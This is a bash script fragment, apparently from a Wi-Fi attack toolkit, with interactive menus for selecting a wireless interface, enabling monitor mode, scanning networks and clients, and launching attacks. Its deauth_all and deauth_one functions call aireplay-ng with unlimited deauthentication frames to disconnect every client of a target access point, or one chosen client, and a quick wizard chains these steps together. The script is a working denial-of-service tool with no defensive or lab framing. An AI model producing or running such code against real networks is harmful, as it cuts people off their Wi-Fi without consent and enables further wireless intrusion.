#!/bin/bash

deauth_all() {

if [[ -z "$bssid" || -z "$mon_iface" ]]; then
echo "Set target and enable monitor mode first!"
pause
return
fi

clear
echo "[+] Deauthing ALL clients on $bssid"
echo

aireplay-ng --deauth 0 -a "$bssid" "$mon_iface"
}

deauth_one() {

if [[ -z "$bssid" || -z "$mon_iface" ]]; then
echo "Set target and enable monitor mode first!"
pause
return
fi

if [[ -z "$clients" ]]; then
echo "No clients scanned yet. Run client scan first."
pause
return
fi

clear
echo "Select client to deauth"
echo

echo "$clients" | nl
echo

read -p "Client number: " num
target=$(echo "$clients" | sed -n "${num}p")

if [[ -z "$target" ]]; then
echo "Invalid selection."
pause
return
fi

echo
echo "[+] Deauthing $target"
echo

aireplay-ng --deauth 0 -a "$bssid" -c "$target" "$mon_iface"
}

quick_wizard() {

select_interface
enable_monitor

scan_networks
select_target
scan_clients

clear
echo -e "${BOLD_CYAN}========== Attack ==========${NC}"
echo
echo -e "  ${RED}1)${NC} Deauth ALL"
echo -e "  ${RED}2)${NC} Select client"
echo -e "  ${YELLOW}3)${NC} Cancel"
echo

read -p "Choice: " c

case $c in
1) deauth_all ;;
2) deauth_one ;;
3) return ;;
esac
}

manual_menu() {

while true; do

clear
echo -e "${BOLD_CYAN}========== Manual Mode ==========${NC}"
echo
echo -e "${DIM}Interface :${NC} ${iface:+${GREEN}${iface}${NC}}${iface:-${YELLOW}Not set${NC}}"
echo -e "${DIM}Monitor   :${NC} ${mon_iface:+${GREEN}${mon_iface}${NC}}${mon_iface:-${YELLOW}Not set${NC}}"
echo -e "${DIM}Target    :${NC} ${bssid:+${GREEN}${bssid}${NC}}${bssid:-${YELLOW}Not set${NC}}"
echo -e "${DIM}Channel   :${NC} ${channel:+${GREEN}${channel}${NC}}${channel:-${YELLOW}Not set${NC}}"
echo
echo -e "  ${CYAN}1)${NC} Select Interface"
echo -e "  ${CYAN}2)${NC} Enable Monitor Mode"
echo -e "  ${CYAN}3)${NC} Scan Networks"
echo -e "  ${CYAN}4)${NC} Select Target"
echo -e "  ${CYAN}5)${NC} Scan Clients"
echo -e "  ${RED}6)${NC} Deauth ALL"
echo -e "  ${RED}7)${NC} Deauth One Client"
echo -e "  ${CYAN}8)${NC} Stop Monitor Mode"
echo -e "  ${YELLOW}9)${NC} Back"
echo

read -p "Choice: " c

case $c in
1) select_interface ;;
2) enable_monitor ;;
3) scan_networks ;;
4) select_target ;;
5) scan_clients ;;
6) deauth_all ;;
7) deauth_one ;;
8) stop_monitor ;;
9) break ;;
esac

done
}